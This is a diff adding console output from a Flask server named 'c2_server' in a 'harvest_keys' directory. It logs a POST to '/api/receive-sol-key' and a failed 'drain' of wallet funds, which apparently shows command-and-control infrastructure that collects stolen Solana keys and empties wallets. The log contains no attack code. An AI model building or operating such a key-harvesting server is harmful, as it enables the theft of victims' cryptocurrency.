@@ -1,0 +1,15 @@
+ * Serving Flask app 'c2_server'
+ * Debug mode: off
+[31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
+ * Running on all addresses (0.0.0.0)
+ * Running on http://127.0.0.1:11001
+ * Running on http://192.168.1.28:11001
+[33mPress CTRL+C to quit[0m
+/home/sobraniex/harvest_keys/c2_server.py:91: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  'timestamp': datetime.utcnow().isoformat(),
+127.0.0.1 - - [08/Oct/2026 14:28:18] "GET /health HTTP/1.1" 200 -
+/home/sobraniex/harvest_keys/c2_server.py:59: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
+  datetime.utcnow().isoformat(),
+[2026-10-08 14:28:18,388] ERROR in c2_server: Drain error: 'coroutine' object has no attribute 'transfer_all'
+127.0.0.1 - - [08/Oct/2026 14:28:18] "[35m[1mPOST /api/receive-sol-key HTTP/1.1[0m" 201 -
+127.0.0.1 - - [08/Oct/2026 14:28:30] "GET /health HTTP/1.1" 200 -
